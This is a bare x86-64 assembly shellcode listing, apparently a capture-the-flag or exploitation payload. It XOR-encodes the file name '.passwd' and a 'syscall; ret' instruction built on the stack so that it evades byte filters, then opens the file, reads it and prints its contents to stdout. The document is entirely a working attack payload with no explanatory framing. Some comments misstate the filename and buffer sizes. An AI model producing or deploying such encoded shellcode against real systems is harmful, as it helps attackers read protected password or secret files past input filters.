BITS 64
  xor al, al

  ; rdx -> NULL
  cqo

  ; open("./passwd", 0)
  mov rbx, 0x056172767664752b
  push rbx
  xor DWORD [rsp], 0x05050505
  xor DWORD [rsp+4], 0x05050505 
  push rsp
  pop rdi

  ; rsi -> 0 = O_RDONLY
  xor rsi, rsi

  ; syscall 2
  mov al, 2

  mov ecx, 0x1c2040e
  xor DWORD ecx, 0x01010101 ; ends up being 'syscall; ret'

  ; do syscall
  push rcx
  call rsp
  pop rcx

  ; save fd
  xchg rax, rdi

  ; syscall 0 -> read
  xor rax, rax

  ; rsi -> buffer
  sub spl, 20
  mov rsi, rsp

  ; rdx -> 10 = size of read
  mov dl, 0xc

  ; do syscall
  push rcx
  call rsp
  pop rcx
  
  ; syscall 1 -> write
  mov al, 1

  ; rdi -> 1 = STDOUT
  mov dil, 1

  ; rsi -> buffer
  ; rdx -> 13 = size of buffer to write

  ; do syscall
  push rcx
  call rsp
